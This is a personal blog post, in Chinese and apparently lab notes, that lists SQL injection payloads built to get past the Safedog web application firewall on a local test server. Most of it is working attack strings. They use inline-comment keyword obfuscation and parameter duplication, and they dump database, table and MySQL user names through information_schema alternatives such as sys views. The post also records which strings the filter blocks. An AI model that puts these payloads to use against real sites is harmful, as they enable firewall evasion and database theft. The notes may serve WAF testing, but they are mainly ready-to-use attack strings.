<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>safedog bypass 4/14 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="url：http:&#x2F;&#x2F;192.168.2.97&#x2F;mysql.php?id&#x3D;1 0x01    and 1&#x3D;1testhttp:&#x2F;&#x2F;192.168.2.97&#x2F;mysql.php?id&#x3D;1 and 1&#x3D;1   –&gt;error 内联注释绕过：http:&#x2F;&#x2F;192.168.2.97&#x2F;mysql.php?id&#x3D;1  &#x2F;!50726and&#x2F;  &#x2F;!507261&#x2F;  &#x2F;!50726&#x3D;&#x2F; &#x2F;!507261&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="safedog bypass 4&#x2F;14">
<meta property="og:url" content="https://stwtgithub.github.io/2021/07/01/safedog-bypass-2021-4-14/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="url：http:&#x2F;&#x2F;192.168.2.97&#x2F;mysql.php?id&#x3D;1 0x01    and 1&#x3D;1testhttp:&#x2F;&#x2F;192.168.2.97&#x2F;mysql.php?id&#x3D;1 and 1&#x3D;1   –&gt;error 内联注释绕过：http:&#x2F;&#x2F;192.168.2.97&#x2F;mysql.php?id&#x3D;1  &#x2F;!50726and&#x2F;  &#x2F;!507261&#x2F;  &#x2F;!50726&#x3D;&#x2F; &#x2F;!507261&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://stwtgithub.github.io/stwt.github.io/2021/07/01/safedog-bypass-2021-4-14/1.png">
<meta property="article:published_time" content="2021-07-01T08:17:48.000Z">
<meta property="article:modified_time" content="2021-07-01T09:56:43.108Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="bypass waf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://stwtgithub.github.io/stwt.github.io/2021/07/01/safedog-bypass-2021-4-14/1.png">
  
    <link rel="alternate" href="/stwt.github.io/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/stwt.github.io/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/stwt.github.io/css/style.css">

  
    
<link rel="stylesheet" href="/stwt.github.io/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/stwt.github.io/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/stwt.github.io/">Home</a>
        
          <a class="main-nav-link" href="/stwt.github.io/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/stwt.github.io/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://stwtgithub.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-safedog-bypass-2021-4-14" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/stwt.github.io/2021/07/01/safedog-bypass-2021-4-14/" class="article-date">
  <time class="dt-published" datetime="2021-07-01T08:17:48.000Z" itemprop="datePublished">2021-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      safedog bypass 4/14
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>url：<a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=1">http://192.168.2.97/mysql.php?id=1</a></p>
<h1 id="0x01-and-1-1"><a href="#0x01-and-1-1" class="headerlink" title="0x01    and 1=1"></a>0x01    and 1=1</h1><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=1">http://192.168.2.97/mysql.php?id=1</a> and 1=1   –&gt;error</p>
<h2 id="内联注释绕过："><a href="#内联注释绕过：" class="headerlink" title="内联注释绕过："></a>内联注释绕过：</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=1">http://192.168.2.97/mysql.php?id=1</a>  /<em>!50726and</em>/  /<em>!507261</em>/  /<em>!50726=</em>/ /<em>!507261</em>/  #</p>
<h2 id="ord绕过-ord-函数返回字符串第一个字符的-ASCII-值。"><a href="#ord绕过-ord-函数返回字符串第一个字符的-ASCII-值。" class="headerlink" title="ord绕过    ord() 函数返回字符串第一个字符的 ASCII 值。"></a>ord绕过    ord() 函数返回字符串第一个字符的 ASCII 值。</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=1">http://192.168.2.97/mysql.php?id=1</a> and ord(‘a’)-97<br><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=1">http://192.168.2.97/mysql.php?id=1</a> and ord(‘a’)-96</p>
<p><img src="/stwt.github.io/2021/07/01/safedog-bypass-2021-4-14/1.png"></p>


<h1 id="0x02-union-select"><a href="#0x02-union-select" class="headerlink" title="0x02    union select"></a>0x02    union select</h1><h2 id="test-1"><a href="#test-1" class="headerlink" title="test"></a>test</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=1">http://192.168.2.97/mysql.php?id=1</a> union select 1,2   –&gt;error</p>
<p>union 不拦截<br>select 不拦截<br>union select 拦截 、中间插入各种字符，拦截<br>union 各种字符<br>select 拦截<br>union%20%a0select 拦截<br>union/<em>select</em>/ 不拦截</p>
<p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> /<em>&amp;id=1 /</em>!12345union*//<em>!12345select</em>/ 1,2 %23</p>
<h1 id="0x03-database-user"><a href="#0x03-database-user" class="headerlink" title="0x03    database() user()"></a>0x03    database() user()</h1><p>database user ()不拦截<br>database() user() 拦截</p>
<p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> database(%23%0a)<br><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=user(%23%0A)">http://192.168.2.97/mysql.php?id=user(%23%0a)</a></p>
<h1 id="0x04-order-by-方法同union-select"><a href="#0x04-order-by-方法同union-select" class="headerlink" title="0x04    order by     方法同union select"></a>0x04    order by     方法同union select</h1><h1 id="0x05-select-from"><a href="#0x05-select-from" class="headerlink" title="0x05    select from"></a>0x05    select from</h1><p>select、from、select from、select 1 from 不拦截<br>select 1 from 2 拦截</p>
<p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> select 1 /<em>!12345from</em>/ (2)</p>
<h1 id="0x06-暴库：select-group-concat-schema-name-from-information-schema-schemata；"><a href="#0x06-暴库：select-group-concat-schema-name-from-information-schema-schemata；" class="headerlink" title="0x06    暴库：select group_concat(schema_name) from information_schema.schemata；"></a>0x06    暴库：select group_concat(schema_name) from information_schema.schemata；</h1><p>infomation_schema.schemata 不拦截<br>select group_concat(schema_name) /<em>!12345from</em>/ (2)    不拦截<br>select group_concat(schema_name) /<em>!12345from</em>/ (information_schema.schemata)    拦截<br>select 1 /<em>!12345from</em>/ (/<em>12345information_schema.schemata</em>/)        不拦截</p>
<p>拦截：information_schema.schemata</p>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> /<em>&amp;id = /</em>!12345union*//<em>!12345select</em>/<br>id 和id空格  不等，是两个值</p>
<h1 id="0x07-暴mysql账号密码"><a href="#0x07-暴mysql账号密码" class="headerlink" title="0x07 暴mysql账号密码"></a>0x07 暴mysql账号密码</h1><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> /<em>&amp;id=1 /</em>!12345union*//<em>!12345select</em>/  1, group_concat(user) /<em>!12345from</em>/ (<code>mysql</code>.<code>user</code>)–</p>
<h1 id="0x08-bypass-information-schema"><a href="#0x08-bypass-information-schema" class="headerlink" title="0x08 bypass information_schema"></a>0x08 bypass information_schema</h1><p>在mysql 5.7中新增了sys.schema,基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。<br>sys.x$ps_schema_table_statistics_io<br>schema_auto_increment_columns<br>schema_table_statistics_with_buffer</p>
<h2 id="暴库："><a href="#暴库：" class="headerlink" title="暴库："></a>暴库：</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> /<em>&amp;id=1 /</em>!12345union*//<em>!12345select</em>/ 1, group_concat(distinct table_schema) /<em>!12345from</em>/ (sys.x$ps_schema_table_statistics_io)–+        （结果和在Mysql中执行的不一致，缺少两个库，nt了，一个是测试环境，一个是本地环境，肯定不一样啊呜呜呜= =）</p>
<h2 id="暴表："><a href="#暴表：" class="headerlink" title="暴表："></a>暴表：</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> /<em>&amp;id=1 /</em>!12345union*//<em>!12345select</em>/ 1, group_concat(distinct table_name) /<em>!12345from</em>/ (sys.x$ps_schema_table_statistics_io) where table_schema=’mysql’–</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>group_concat()：存在长度限制，使用substr()，依次爆出各个数字开头的表名，substr()会被拦截，使用双括号绕过，或者使用其他截取函数，未测试（left right substring mid）</p>
<p><a target="_blank" rel="noopener" href="http://192.168.2.97/mysql.php?id=">http://192.168.2.97/mysql.php?id=</a> /<em>&amp;id=1 /</em>!12345union*//<em>!12345select</em>/ 1, group_concat(distinct table_name) /<em>!12345from</em>/ (sys.x$ps_schema_table_statistics_io) where table_schema=’mysql’ /<em>!50726and</em>/  ((substr(table_name,1,1)))  /<em>!50726=</em>/unhex(75)–</p>
<h2 id="暴字段："><a href="#暴字段：" class="headerlink" title="暴字段："></a>暴字段：</h2><p>报错注入：select*from (select * from user as a join user b using (host,user))c;</p>
<h1 id="0x09-无列名注入"><a href="#0x09-无列名注入" class="headerlink" title="0x09 无列名注入"></a>0x09 无列名注入</h1><p>SELECT <code>3</code> FROM (SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION SELECT * FROM dede_member)as X;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://stwtgithub.github.io/2021/07/01/safedog-bypass-2021-4-14/" data-id="ckqkqgixr00000ouw5s3xem2n" data-title="safedog bypass 4/14" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/stwt.github.io/tags/bypass-waf/" rel="tag">bypass waf</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/stwt.github.io/2021/03/15/article-title/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">article title</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/stwt.github.io/tags/bypass-waf/" rel="tag">bypass waf</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/stwt.github.io/tags/bypass-waf/" style="font-size: 10px;">bypass waf</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/stwt.github.io/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/stwt.github.io/archives/2021/03/">March 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/stwt.github.io/2021/07/01/safedog-bypass-2021-4-14/">safedog bypass 4/14</a>
          </li>
        
          <li>
            <a href="/stwt.github.io/2021/03/15/article-title/">article title</a>
          </li>
        
          <li>
            <a href="/stwt.github.io/2021/03/15/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/stwt.github.io/" class="mobile-nav-link">Home</a>
  
    <a href="/stwt.github.io/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/stwt.github.io/js/jquery-3.4.1.min.js"></script>



  
<script src="/stwt.github.io/fancybox/jquery.fancybox.min.js"></script>




<script src="/stwt.github.io/js/script.js"></script>





  </div>
</body>
</html>